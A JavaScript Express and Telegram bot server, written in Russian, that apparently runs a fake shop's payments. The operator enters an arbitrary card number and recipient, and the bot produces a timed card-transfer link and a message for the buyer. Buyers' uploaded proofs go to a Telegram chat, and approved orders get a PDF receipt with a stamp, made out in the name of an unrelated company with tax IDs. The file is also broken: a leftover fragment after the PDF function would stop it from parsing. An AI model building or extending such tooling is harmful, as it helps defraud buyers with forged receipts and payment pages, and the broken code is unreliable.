require("dotenv").config();

const express = require("express");
const multer = require("multer");
const cors = require("cors");
const PDFDocument = require("pdfkit");
const fs = require("fs");
const path = require("path");
const { Telegraf, Markup } = require("telegraf");

const BOT_TOKEN = process.env.BOT_TOKEN;
const TG_CHAT_ID = process.env.TG_CHAT_ID;
const BASE_PAYMENT_URL = process.env.BASE_PAYMENT_URL || "https://warepointpay.ru";
const APP_BASE_URL = process.env.APP_BASE_URL || "https://warepoint-pay-bot.onrender.com";
const PORT = Number(process.env.PORT || 3000);

if (!BOT_TOKEN) {
  throw new Error("Не задан BOT_TOKEN");
}
if (!TG_CHAT_ID) {
  throw new Error("Не задан TG_CHAT_ID");
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();

const STAMP_PATH = path.join(__dirname, "stamp.png");
const FONT_REGULAR = path.join(__dirname, "DejaVuSans.ttf");
const FONT_BOLD = path.join(__dirname, "DejaVuSans-Bold.ttf");

// -------------------- middlewares --------------------
app.use(cors({
  origin: "*",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));
app.options("*", cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowedMime = ["application/pdf", "image/jpeg", "image/png"];
    const allowedExt = [".pdf", ".jpg", ".jpeg", ".png"];
    const name = String(file.originalname || "").toLowerCase();
    const validExt = allowedExt.some((ext) => name.endsWith(ext));

    if (allowedMime.includes(file.mimetype) || validExt) {
      return cb(null, true);
    }

    cb(new Error("Разрешены только PDF, JPG, JPEG и PNG"));
  }
});

// -------------------- storage in memory --------------------
/**
 * ВНИМАНИЕ:
 * это хранение в памяти.
 * После перезапуска Render данные пропадут.
 * Для старта этого достаточно.
 */
const sessions = new Map();   // создание новой ссылки
const history = new Map();    // история по пользователю
const orders = new Map();     // статусы/данные заказов

const STEPS = [
  { key: "order", label: "Введите номер заказа", example: "Например: 5555" },
  { key: "product", label: "Введите название товара", example: "Например: RTX 5070" },
  { key: "amount", label: "Введите сумму к оплате", example: "Например: 55000" },
  { key: "card", label: "Введите номер карты", example: "Например: 5555555555555555" },
  { key: "bank", label: "Введите название банка", example: "Например: Озон-Банк" },
  { key: "recipient", label: "Введите ФИО получателя", example: "Например: Ключко Андрей" },
  { key: "minutes", label: "Введите время таймера в минутах", example: "Например: 15" }
];

// -------------------- utils --------------------
function formatAmount(value) {
  const num = String(value || "").replace(/[^\d]/g, "");
  if (!num) return "0 ₽";
  return `${Number(num).toLocaleString("ru-RU")} ₽`;
}

function normalizeAmount(value) {
  return String(value || "").replace(/[^\d]/g, "");
}

function normalizeCard(value) {
  return String(value || "").replace(/[^\d]/g, "");
}

function normalizeMinutes(value) {
  const num = parseInt(String(value || "").replace(/[^\d]/g, ""), 10);
  if (!num || num < 1) return "15";
  if (num > 1440) return "1440";
  return String(num);
}

function escapeHtml(str = "") {
  return String(str)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function getMainKeyboard() {
  return Markup.keyboard([
    ["💸 Новый платеж", "📄 Мои ссылки"],
    ["🔁 Повторить", "❌ Отмена"],
    ["ℹ️ Помощь"]
  ]).resize();
}

function getReceiptDecisionKeyboard(order) {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("✅ Подтвердить", `approve:${order}`),
      Markup.button.callback("❌ Отклонить", `reject:${order}`)
    ]
  ]);
}

function getHistory(userId) {
  return history.get(String(userId)) || [];
}

function saveHistory(userId, payload) {
  const key = String(userId);
  const list = history.get(key) || [];
  list.unshift({
    ...payload,
    createdAt: new Date().toISOString()
  });
  history.set(key, list.slice(0, 10));
}

function buildPaymentUrl(data) {
  const expiresAt = Date.now() + Number(normalizeMinutes(data.minutes)) * 60 * 1000;

  const prepared = {
    order: String(data.order || ""),
    product: String(data.product || ""),
    amount: normalizeAmount(data.amount || ""),
    card: normalizeCard(data.card || ""),
    bank: String(data.bank || ""),
    recipient: String(data.recipient || ""),
    minutes: normalizeMinutes(data.minutes || "15"),
    status: "pending",
    expiresAt,
    updatedAt: Date.now()
  };

  orders.set(prepared.order, {
    ...(orders.get(prepared.order) || {}),
    ...prepared
  });

  const params = new URLSearchParams({
    order: prepared.order,
    product: prepared.product,
    amount: prepared.amount,
    card: prepared.card,
    bank: prepared.bank,
    recipient: prepared.recipient,
    method: "Перевод на карту",
    expires: String(prepared.expiresAt)
  });

  return `${BASE_PAYMENT_URL}?${params.toString()}`;
}

function buildClientMessage(data, url) {
  return [
    `Здравствуйте! Ваш заказ № ${data.order} сформирован.`,
    "",
    `Товар: ${data.product}`,
    `Сумма к оплате: ${formatAmount(data.amount)}`,
    "",
    `Ссылка на оплату:`,
    url,
    "",
    `После оплаты нажмите кнопку «Я оплатил» на странице и отправьте подтверждение.`
  ].join("\n");
}

function ensureFonts() {
  if (!fs.existsSync(FONT_REGULAR)) {
    throw new Error("Не найден файл DejaVuSans.ttf");
  }
  if (!fs.existsSync(FONT_BOLD)) {
    throw new Error("Не найден файл DejaVuSans-Bold.ttf");
  }
}

function generateConfirmationPdfBuffer(meta) {
  return new Promise((resolve, reject) => {
    try {
      ensureFonts();

      const doc = new PDFDocument({
        size: "A4",
        margin: 32
      });

      const chunks = [];
      doc.on("data", (chunk) => chunks.push(chunk));
      doc.on("end", () => resolve(Buffer.concat(chunks)));
      doc.on("error", reject);

      doc.registerFont("regular", FONT_REGULAR);
      doc.registerFont("bold", FONT_BOLD);

      const order = String(meta.order || "—");
      const product = String(meta.product || "Товар");
      const amountRaw = String(meta.amount || "0").replace(/[^\d]/g, "");
      const amountNumber = Number(amountRaw || 0);
      const amount = amountNumber.toLocaleString("ru-RU", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      }) + " ₽";

      const date = new Date().toLocaleString("ru-RU");

      const pageWidth = doc.page.width;
      const left = 32;
      const right = pageWidth - 32;
      const contentWidth = right - left;

      function line(y) {
        doc
          .moveTo(left, y)
          .lineTo(right, y)
          .lineWidth(1)
          .strokeColor("#555555")
          .stroke();
      }

      function stars(y) {
        doc
          .font("regular")
          .fontSize(10)
          .fillColor("#7a7a7a")
          .text("* ".repeat(42), left, y, {
            width: contentWidth,
            align: "center"
          });
      }

      // фон
      doc.rect(0, 0, doc.page.width, doc.page.height).fill("#efefef");

      // верхний мини-блок
      doc
        .font("bold")
        .fontSize(17)
        .fillColor("#111")
        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, 18, {
          width: contentWidth
        });

      doc
        .font("regular")
        .fontSize(11)
        .fillColor("#111")
        .text("ИНН: 7718912655", left, 42)
        .text("ОГРН: 1127747210909", left, 58)
        .text("КПП: 500101001", left, 74);

      // небольшой логотип сверху по центру, если есть печать
      if (fs.existsSync(STAMP_PATH)) {
        try {
          doc.image(STAMP_PATH, pageWidth / 2 - 42, 120, {
            fit: [84, 84],
            align: "center",
            valign: "center"
          });
        } catch (e) {
          console.error("STAMP ERROR:", e);
        }
      }

      // заголовок чека
      line(188);

      doc
        .font("bold")
        .fontSize(12)
        .fillColor("#111")
        .text('Чек- ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, 195, {
          width: contentWidth
        });

      line(220);

      doc
        .font("bold")
        .fontSize(11)
        .text(date, left, 228, {
          width: contentWidth,
          align: "right"
        });

      // центральный блок компании
      let y = 290;

      doc
        .font("regular")
        .fontSize(11)
        .fillColor("#111")
        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, y, {
          width: contentWidth,
          align: "center"
        });

      y += 22;
      doc.text("Офис: г. Москва", left, y, {
        width: contentWidth,
        align: "center"
      });

      y += 20;
      doc
        .fillColor("#1d4ed8")
        .text("г. Москва", left, y, {
          width: contentWidth,
          align: "center"
        });

      y += 20;
      doc
        .fillColor("#111")
        .text("ИНН 7718912655", left, y, {
          width: contentWidth,
          align: "center"
        });

      y += 48;
      stars(y);

      // товар
      y += 42;
      doc
        .font("regular")
        .fontSize(12)
        .fillColor("#111")
        .text(product, left + 142, y, {
          width: 370,
          align: "left"
        });

      doc
        .text("1шт", right - 110, y + 10, {
          width: 80,
          align: "right"
        });

      y += 52;
      doc
        .font("bold")
        .fontSize(13)
        .text(amount, right - 150, y, {
          width: 120,
          align: "right"
        });

      y += 56;
      stars(y);

      // доставка
      y += 38;
      doc
        .font("regular")
        .fontSize(12)
        .text("Доставка", left + 152, y);

      doc
        .text("0.00", right - 120, y, {
          width: 80,
          align: "right"
        });

      y += 28;
      doc
        .font("regular")
        .fontSize(11)
        .fillColor("#666")
        .text("Бесплатно", right - 125, y, {
          width: 85,
          align: "right"
        });

      y += 26;
      stars(y);

      // безналичный / сбп
      y += 38;
      doc
        .font("regular")
        .fontSize(12)
        .fillColor("#111")
        .text("Безналичный", left + 152, y);

      doc
        .text(amount, right - 150, y, {
          width: 120,
          align: "right"
        });

      y += 24;
      doc
        .text("Платёж через СБП", left, y, {
          width: contentWidth,
          align: "center"
        });

      // сумма
      y += 36;
      doc
        .font("bold")
        .fontSize(12)
        .text("Сума", left + 146, y);

      doc
        .text(amount, right - 150, y, {
          width: 120,
          align: "right"
        });

      // ндс
      y += 34;
      doc
        .font("regular")
        .fontSize(12)
        .text("С НДС НЕТ", left + 146, y);

      doc
        .fillColor("#bcbcbc")
        .text("0%", pageWidth / 2 - 8, y);

      doc
        .fillColor("#111")
        .text("0", right - 72, y, {
          width: 40,
          align: "right"
        });

      // заказ
      y += 34;
      doc
        .font("regular")
        .fontSize(12)
        .text(`Заказ №${order}`, left + 146, y);

      y += 18;
      stars(y);

      // QR-заглушка или печать снизу
      if (fs.existsSync(STAMP_PATH)) {
        try {
          doc.image(STAMP_PATH, pageWidth / 2 - 90, y + 34, {
            fit: [180, 180],
            align: "center",
            valign: "center"
          });
        } catch (e) {
          console.error("STAMP ERROR:", e);
        }
      }

      doc.end();
    } catch (err) {
      reject(err);
    }
  });
}

      doc.moveDown(4);
      doc.font("regular").fontSize(10).text("Чек сформирован автоматически", { align: "center" });
      doc.font("regular").fontSize(10).text("ООО «WAREPOINT»", { align: "center" });

      doc.end();
    } catch (err) {
      reject(err);
    }
  });
}

function buildReceiptHtml(meta) {
  const order = meta.order || "—";
  const product = meta.product || "—";
  const amount = formatAmount(meta.amount || "0");
  const dateText = new Date().toLocaleString("ru-RU");

  return `<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Подтверждение оплаты</title>
<style>
  body {
    margin: 0;
    background: #0b0f14;
    font-family: Arial, sans-serif;
    color: #fff;
  }
  .wrap {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    box-sizing: border-box;
  }
  .card {
    width: 100%;
    max-width: 720px;
    background: linear-gradient(180deg, #111827 0%, #0b0f14 100%);
    border: 1px solid rgba(255,255,255,.08);
    border-radius: 24px;
    padding: 28px;
    box-shadow: 0 30px 80px rgba(0,0,0,.45);
  }
  .title {
    font-size: 30px;
    font-weight: 800;
    margin-bottom: 16px;
  }
  .badge {
    display: inline-block;
    padding: 10px 14px;
    border-radius: 999px;
    background: rgba(34,197,94,.14);
    color: #bbf7d0;
    border: 1px solid rgba(34,197,94,.25);
    margin-bottom: 20px;
    font-weight: 700;
  }
  .row {
    padding: 14px 16px;
    border-radius: 16px;
    background: rgba(255,255,255,.04);
    border: 1px solid rgba(255,255,255,.06);
    margin-bottom: 12px;
  }
  .k {
    color: #94a3b8;
    font-size: 13px;
    margin-bottom: 6px;
  }
  .v {
    font-size: 18px;
    font-weight: 700;
  }
</style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="title">WAREPOINT</div>
      <div class="badge">✔ Оплата подтверждена</div>

      <div class="row">
        <div class="k">Номер заказа</div>
        <div class="v"># ${escapeHtml(order)}</div>
      </div>

      <div class="row">
        <div class="k">Товар</div>
        <div class="v">${escapeHtml(product)}</div>
      </div>

      <div class="row">
        <div class="k">Сумма</div>
        <div class="v">${escapeHtml(amount)}</div>
      </div>

      <div class="row">
        <div class="k">Дата подтверждения</div>
        <div class="v">${escapeHtml(dateText)}</div>
      </div>
    </div>
  </div>
</body>
</html>`;
}

// -------------------- bot logic --------------------
async function askNextStep(ctx, session) {
  const step = STEPS[session.stepIndex];
  if (!step) return;

  await ctx.reply(
    `${step.label}\n${step.example}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("Отмена", "cancel_create")]
    ])
  );
}

bot.start(async (ctx) => {
  await ctx.reply("Бот работает 🚀", getMainKeyboard());
});

bot.command("newpay", async (ctx) => {
  sessions.set(String(ctx.from.id), {
    stepIndex: 0,
    data: {}
  });

  await ctx.reply("Начинаем создание новой ссылки.", getMainKeyboard());
  await askNextStep(ctx, sessions.get(String(ctx.from.id)));
});

bot.command("mylinks", async (ctx) => {
  const list = getHistory(ctx.from.id);

  if (!list.length) {
    await ctx.reply("Пока нет созданных ссылок.", getMainKeyboard());
    return;
  }

  const text = list.map((item, i) => {
    return [
      `${i + 1}. Заказ #${item.order}`,
      `Товар: ${item.product}`,
      `Сумма: ${formatAmount(item.amount)}`,
      `Ссылка: ${item.url}`
    ].join("\n");
  }).join("\n\n");

  await ctx.reply(text, getMainKeyboard());
});

bot.command("repeat", async (ctx) => {
  const list = getHistory(ctx.from.id);

  if (!list.length) {
    await ctx.reply("Нет предыдущих заказов для повтора.", getMainKeyboard());
    return;
  }

  const last = list[0];
  const url = buildPaymentUrl(last);

  saveHistory(ctx.from.id, { ...last, url });

  await ctx.reply(
    `✅ Ссылка создана\n\nЗаказ: ${last.order}\nТовар: ${last.product}\nСумма: ${formatAmount(last.amount)}\n\n${url}`,
    Markup.inlineKeyboard([
      [Markup.button.url("Открыть ссылку", url)]
    ])
  );
});

bot.command("cancel", async (ctx) => {
  sessions.delete(String(ctx.from.id));
  await ctx.reply("Создание ссылки отменено.", getMainKeyboard());
});

bot.hears("💸 Новый платеж", async (ctx) => {
  sessions.set(String(ctx.from.id), {
    stepIndex: 0,
    data: {}
  });

  await ctx.reply("Начинаем создание новой ссылки.", getMainKeyboard());
  await askNextStep(ctx, sessions.get(String(ctx.from.id)));
});

bot.hears("📄 Мои ссылки", async (ctx) => {
  const list = getHistory(ctx.from.id);

  if (!list.length) {
    await ctx.reply("Пока нет созданных ссылок.", getMainKeyboard());
    return;
  }

  const text = list.map((item, i) => {
    return [
      `${i + 1}. Заказ #${item.order}`,
      `Товар: ${item.product}`,
      `Сумма: ${formatAmount(item.amount)}`,
      `Ссылка: ${item.url}`
    ].join("\n");
  }).join("\n\n");

  await ctx.reply(text, getMainKeyboard());
});

bot.hears("🔁 Повторить", async (ctx) => {
  const list = getHistory(ctx.from.id);

  if (!list.length) {
    await ctx.reply("Нет предыдущих заказов для повтора.", getMainKeyboard());
    return;
  }

  const last = list[0];
  const url = buildPaymentUrl(last);

  saveHistory(ctx.from.id, { ...last, url });

  await ctx.reply(
    `✅ Ссылка создана\n\nЗаказ: ${last.order}\nТовар: ${last.product}\nСумма: ${formatAmount(last.amount)}\n\n${url}`,
    Markup.inlineKeyboard([
      [Markup.button.url("Открыть ссылку", url)]
    ])
  );
});

bot.hears("❌ Отмена", async (ctx) => {
  sessions.delete(String(ctx.from.id));
  await ctx.reply("Создание ссылки отменено.", getMainKeyboard());
});

bot.hears("ℹ️ Помощь", async (ctx) => {
  await ctx.reply(
    [
      "Используй кнопки ниже:",
      "💸 Новый платеж",
      "📄 Мои ссылки",
      "🔁 Повторить",
      "❌ Отмена"
    ].join("\n"),
    getMainKeyboard()
  );
});

bot.action("cancel_create", async (ctx) => {
  sessions.delete(String(ctx.from.id));
  await ctx.answerCbQuery("Отменено");
  await ctx.editMessageReplyMarkup({ inline_keyboard: [] }).catch(() => {});
  await ctx.reply("Создание ссылки отменено.", getMainKeyboard());
});

bot.action(/^approve:(.+)$/, async (ctx) => {
  try {
    const order = String(ctx.match[1]);
    const current = orders.get(order);

    if (!current) {
      await ctx.answerCbQuery("Заказ не найден");
      return;
    }

    orders.set(order, {
      ...current,
      status: "approved",
      updatedAt: Date.now()
    });

    await ctx.answerCbQuery("Оплата подтверждена");

    const originalText = (
      ctx.update.callback_query.message.caption ||
      ctx.update.callback_query.message.text ||
      ""
    ).trim();

    const newText = `${originalText}\n\n✅ <b>Статус:</b> Оплата подтверждена`;

    if (ctx.update.callback_query.message.photo || ctx.update.callback_query.message.document) {
      await ctx.editMessageCaption(newText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([]).reply_markup
      }).catch(() => {});
    } else {
      await ctx.editMessageText(newText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([]).reply_markup
      }).catch(() => {});
    }

    const meta = orders.get(order);
    const pdfBuffer = await generateConfirmationPdfBuffer(meta);
    const receiptUrl = `${APP_BASE_URL}/receipt?order=${encodeURIComponent(order)}`;

    await ctx.reply(`✅ Заказ #${order} подтвержден.`);

    await bot.telegram.sendDocument(
      ctx.chat.id,
      {
        source: pdfBuffer,
        filename: `Подтверждение_оплаты_заказ_${order}.pdf`
      },
      {
        caption: [
          "📄 Подтверждение оплаты от магазина",
          `Заказ: #${order}`,
          "",
          "Ссылка для клиента:",
          receiptUrl
        ].join("\n")
      }
    );
  } catch (err) {
    console.error("APPROVE ERROR:", err);
    await ctx.answerCbQuery("Ошибка");
  }
});

bot.action(/^reject:(.+)$/, async (ctx) => {
  try {
    const order = String(ctx.match[1]);
    const current = orders.get(order);

    if (!current) {
      await ctx.answerCbQuery("Заказ не найден");
      return;
    }

    orders.set(order, {
      ...current,
      status: "rejected",
      updatedAt: Date.now()
    });

    await ctx.answerCbQuery("Оплата отклонена");

    const originalText = (
      ctx.update.callback_query.message.caption ||
      ctx.update.callback_query.message.text ||
      ""
    ).trim();

    const newText = `${originalText}\n\n❌ <b>Статус:</b> Оплата отклонена`;

    if (ctx.update.callback_query.message.photo || ctx.update.callback_query.message.document) {
      await ctx.editMessageCaption(newText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([]).reply_markup
      }).catch(() => {});
    } else {
      await ctx.editMessageText(newText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([]).reply_markup
      }).catch(() => {});
    }

    await ctx.reply(`❌ Заказ #${order} отклонен.`);
  } catch (err) {
    console.error("REJECT ERROR:", err);
    await ctx.answerCbQuery("Ошибка");
  }
});

bot.on("text", async (ctx) => {
  const text = String(ctx.message.text || "").trim();

  if (
    text === "/start" ||
    text === "/newpay" ||
    text === "/mylinks" ||
    text === "/repeat" ||
    text === "/cancel" ||
    text === "💸 Новый платеж" ||
    text === "📄 Мои ссылки" ||
    text === "🔁 Повторить" ||
    text === "❌ Отмена" ||
    text === "ℹ️ Помощь"
  ) {
    return;
  }

  const session = sessions.get(String(ctx.from.id));
  if (!session) return;

  const step = STEPS[session.stepIndex];
  if (!step) return;

  let value = text;

  if (step.key === "amount") {
    value = normalizeAmount(value);
    if (!value) {
      await ctx.reply("Введите корректную сумму.");
      return;
    }
  }

  if (step.key === "card") {
    value = normalizeCard(value);
    if (value.length < 12) {
      await ctx.reply("Введите корректный номер карты.");
      return;
    }
  }

  if (step.key === "minutes") {
    value = normalizeMinutes(value);
  }

  session.data[step.key] = value;
  session.stepIndex += 1;
  sessions.set(String(ctx.from.id), session);

  if (session.stepIndex >= STEPS.length) {
    const url = buildPaymentUrl(session.data);

    saveHistory(ctx.from.id, { ...session.data, url });

    await ctx.reply(
      `✅ Ссылка создана\n\nЗаказ: ${session.data.order}\nТовар: ${session.data.product}\nСумма: ${formatAmount(session.data.amount)}\n\n${url}`,
      Markup.inlineKeyboard([
        [Markup.button.url("Открыть ссылку", url)]
      ])
    );

    const clientMessage = buildClientMessage(session.data, url);
    await ctx.reply(`📋 Шаблон сообщения клиенту:\n\n${clientMessage}`, getMainKeyboard());

    sessions.delete(String(ctx.from.id));
    return;
  }

  await askNextStep(ctx, session);
});

// -------------------- http routes --------------------
app.get("/", (req, res) => {
  res.status(200).send("Bot is running");
});

app.get("/status", (req, res) => {
  const order = String(req.query.order || "").trim();

  if (!order) {
    return res.status(400).json({
      ok: false,
      error: "Не передан номер заказа"
    });
  }

  const meta = orders.get(order);

  if (!meta) {
    return res.json({
      ok: true,
      status: "pending",
      expiresAt: null
    });
  }

  return res.json({
    ok: true,
    status: meta.status || "pending",
    expiresAt: meta.expiresAt || null
  });
});

app.get("/receipt", (req, res) => {
  const order = String(req.query.order || "").trim();
  const meta = orders.get(order);

  if (!order || !meta || meta.status !== "approved") {
    return res.status(404).send("Подтверждение не найдено или заказ не подтвержден");
  }

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  return res.send(buildReceiptHtml(meta));
});

app.post("/send", upload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({
        ok: false,
        error: "Файл не прикреплен"
      });
    }

    const {
      order = "",
      product = "",
      amount = "",
      recipient = "",
      bank = "",
      method = "",
      card_last4 = "",
      comment = ""
    } = req.body || {};

    const key = String(order || "");

    const current = orders.get(key) || {};
    orders.set(key, {
      ...current,
      order: key,
      product: product || current.product || "",
      amount: normalizeAmount(amount || current.amount || ""),
      recipient: recipient || current.recipient || "",
      bank: bank || current.bank || "",
      method: method || current.method || "Перевод на карту",
      cardLast4: card_last4 || current.cardLast4 || "",
      status: current.status || "pending",
      expiresAt: current.expiresAt || null,
      updatedAt: Date.now()
    });

    const status = orders.get(key)?.status || "pending";

    let statusText = "🟡 <b>Статус:</b> Ожидает проверки";
    if (status === "approved") statusText = "✅ <b>Статус:</b> Оплата подтверждена";
    if (status === "rejected") statusText = "❌ <b>Статус:</b> Оплата отклонена";

    const caption = [
      "📥 <b>Новое подтверждение оплаты</b>",
      "",
      `📦 <b>Заказ:</b> ${escapeHtml(order || "—")}`,
      `🖥 <b>Товар:</b> ${escapeHtml(product || "—")}`,
      `💰 <b>Сумма:</b> ${escapeHtml(formatAmount(amount || "0"))}`,
      `👤 <b>Получатель:</b> ${escapeHtml(recipient || "—")}`,
      `🏦 <b>Банк:</b> ${escapeHtml(bank || "—")}`,
      `💳 <b>Карта:</b> **** ${escapeHtml(card_last4 || "—")}`,
      `💸 <b>Метод:</b> ${escapeHtml(method || "—")}`,
      "",
      `💬 <b>Комментарий:</b> ${escapeHtml(comment || "—")}`,
      "",
      statusText
    ].join("\n");

    const keyboard = getReceiptDecisionKeyboard(key).reply_markup;
    const isImage = String(req.file.mimetype || "").startsWith("image/");

    if (isImage) {
      await bot.telegram.sendPhoto(
        TG_CHAT_ID,
        { source: req.file.buffer, filename: req.file.originalname },
        {
          caption,
          parse_mode: "HTML",
          reply_markup: keyboard
        }
      );
    } else {
      await bot.telegram.sendDocument(
        TG_CHAT_ID,
        { source: req.file.buffer, filename: req.file.originalname },
        {
          caption,
          parse_mode: "HTML",
          reply_markup: keyboard
        }
      );
    }

    return res.status(200).json({
      ok: true,
      message: "Файл успешно отправлен"
    });
  } catch (error) {
    console.error("SEND ERROR:", error);
    return res.status(500).json({
      ok: false,
      error: error.message || "Ошибка отправки"
    });
  }
});

app.use((err, req, res, next) => {
  console.error("EXPRESS ERROR:", err);

  if (err instanceof multer.MulterError && err.code === "LIMIT_FILE_SIZE") {
    return res.status(400).json({
      ok: false,
      error: "Файл больше 10 МБ"
    });
  }

  return res.status(400).json({
    ok: false,
    error: err.message || "Ошибка запроса"
  });
});

// -------------------- webhook --------------------
app.post("/bot", bot.webhookCallback("/bot"));

app.listen(PORT, async () => {
  console.log(`Server started on port ${PORT}`);

  try {
    await bot.telegram.deleteWebhook();
    await bot.telegram.setWebhook(`${APP_BASE_URL}/bot`);
    console.log(`Webhook set: ${APP_BASE_URL}/bot`);
  } catch (err) {
    console.error("Webhook error:", err);
  }
});
